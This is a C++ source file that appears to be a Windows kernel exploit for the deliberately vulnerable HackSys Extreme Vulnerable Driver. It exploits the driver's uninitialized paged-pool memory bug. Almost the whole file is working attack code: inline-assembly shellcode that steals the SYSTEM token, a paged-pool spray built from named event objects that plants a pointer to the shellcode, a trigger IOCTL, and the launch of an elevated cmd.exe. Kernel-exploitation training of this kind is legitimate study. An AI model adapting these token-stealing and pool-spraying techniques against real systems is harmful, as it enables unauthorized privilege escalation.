#define _CRT_SECURE_NO_WARNINGS 0
#include <iostream>
#include <Windows.h>
#include <Psapi.h>

void pwn() {
	__asm {
		pushad
		xor eax, eax
		mov eax, fs:[eax+124h]
		mov eax, [eax+050h]
		mov ecx, eax
		mov edx, 4
	SearchSystemPID:
			mov eax, [eax+0b8h]
			sub eax, 0b8h
			cmp [eax+0b4h], edx
			jne SearchSystemPID
		mov edx, [eax+0f8h]
		mov [ecx+0f8h], edx
		popad
	}
}

HANDLE eventArrs[256] = { NULL };
#define LOOKASIDE_NUMS 256

void pool_spray() {
	std::cout << "[+] Spraying 0xf0 PagedPool chunk\n";
	char name[0x100] = { 0 };
	memset(name, 'A', 0xf0);
	printf("[+] Shellcode Address: %#x\n", (DWORD)pwn);
	for (int i = 0; i < LOOKASIDE_NUMS; i++) {		
		*(DWORD*)(name + 4) = (DWORD)&pwn;
	//	*(DWORD*)(name + 0xf0 - 4) = i;
		name[0xf0 - 1] = i;
		eventArrs[i] = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)name);
		if (!eventArrs[i]) {
			for (int k = 0; k < i; k++) {
				CloseHandle(eventArrs[k]);
			}
			std::cout << "[x] Failed to spray event\n";
			exit(-1);
		}
	}
	std::cout << "[+] Freeing all 0xf0 PagedPool chunks\n";
	for (int i = 0; i < LOOKASIDE_NUMS; i++) {
		CloseHandle(eventArrs[i]);
		i += 4;
	}
}

static void cmd() {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) {
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

int main()
{
    std::cout << "[+] UninitializedMemoryPagedPool!\n";
	DWORD retLength = 0;
	DWORD inBuffer[4096] = { 0 };
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);
	
	if (!hDevice) {
		std::cout << "[x] Failed to create driver file\n";
		return -1;
	}

	pool_spray();

	int status = DeviceIoControl(hDevice, 0x222033, (LPVOID)inBuffer, 0xf0, NULL, 0, &retLength, NULL);

	cmd();
//	system("pause");
	std::cout << "[+] EXP NERVER END\n";
	return 0;
}
